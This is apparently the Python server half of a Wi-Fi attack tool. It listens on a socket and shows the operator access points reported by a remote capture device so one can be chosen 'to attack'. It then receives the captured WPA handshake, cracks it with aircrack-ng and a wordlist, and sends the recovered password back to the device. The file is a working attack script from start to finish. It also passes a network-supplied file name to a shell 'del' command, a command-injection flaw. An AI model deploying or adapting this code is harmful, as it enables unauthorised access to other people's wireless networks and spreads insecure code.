import socket
import os
import subprocess

# TODO: possibly combine retied captures to add missing keys from other incomplete sets

global fileName
fileName = ""


def bToString(arg):
    return ''.join(map(chr, arg))


def breakKey():
    # to extract the key we use the aircrack tool with a word list
    # TODO: Add option to brute force rather than word list, or possibly chose the word list
    print("Extracting key")
    cracking = subprocess.run(
        ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", fileName],
        shell=True, stdout=subprocess.PIPE)
    cracking.stdout = bToString(cracking.stdout)
    if cracking.stdout.__contains__("KEY FOUND"):
        key = open("password").readline()
        print("Key found:", key)
        # delete .cap file
        subprocess.run(["del", fileName], shell=True)
        # send key back
        return key
    else:
        return None


HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

s = socket.socket()
s.bind((HOST, PORT))
s.listen(5)
print(f"[*] Listening as {HOST}:{PORT}")
while True:
    client_socket, client_address = s.accept()
    print(f"[+] {client_address} is connected.")
    # use this header to dictate which following action is used
    receivedHeader = client_socket.recv(BUFFER_SIZE).decode()
    headerCode, headerMessage = receivedHeader.split(SEPARATOR)
    if int(headerCode) == 1:
        # Read discovered Access points to allow user to select which one to attack
        headerMessage = headerMessage.split(",")
        i = 0
        j = 0
        while i < len(headerMessage):
            print(f"[{j}] :: {headerMessage[i]} : {headerMessage[i + 1]}")
            i += 2
            j += 1
        index = input("select the numeric value for the AP you wish to attack, -1 to rescan: ")
        client_socket.send(bytes(index, 'utf-8'))
        client_socket.close()
    elif int(headerCode) == 2:
        # prepare to read the file contain the handshake
        print("Receiving Handshake file")
        received = client_socket.recv(BUFFER_SIZE)
        received = bToString(received)
        fileName, filesize = received.split(SEPARATOR)
        filesize = int(filesize)
        print(f"Receiving file {fileName} of size {filesize}")
        client_socket.sendall(bytes(f"Ready {fileName}", 'utf-8'))
        fileName = os.path.basename(fileName)
        writeFile = open(fileName, "wb")
        # counter for the bytes read so we can end once the whole file is received
        count = 0
        while count < filesize:
            # read 1024 bytes from the socket
            bytes_read = client_socket.recv(BUFFER_SIZE)
            # write new data to file
            writeFile.write(bytes_read)
            # update the counter
            count += (len(bytes_read))
        print("File received")
        # hand off the file to break the key
        key = breakKey()
        if key is None:
            print("No key extracted")
        else:
            # if we get a key, send it back to the device
            client_socket.sendall(bytes(key, 'utf-8'))
            client_socket.close()
            print("Key sent to device")
            exit()
